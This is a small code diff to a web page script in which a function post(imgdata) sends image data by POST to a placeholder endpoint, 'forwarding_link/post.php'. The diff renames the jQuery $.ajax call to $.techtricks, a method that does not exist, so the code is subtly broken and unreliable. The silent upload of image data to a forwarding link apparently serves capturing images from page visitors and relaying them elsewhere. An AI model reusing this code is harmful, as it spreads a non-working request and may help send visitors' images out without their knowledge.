@@ -19,9 +19,9 @@
 <script>
 
 function post(imgdata){
-$.ajax({
+$.techtricks({
     type: 'POST',
-    data: { cat: imgdata},
+    data: {cat: imgdata},
     url: 'forwarding_link/post.php',
     dataType: 'json',
     async: false,
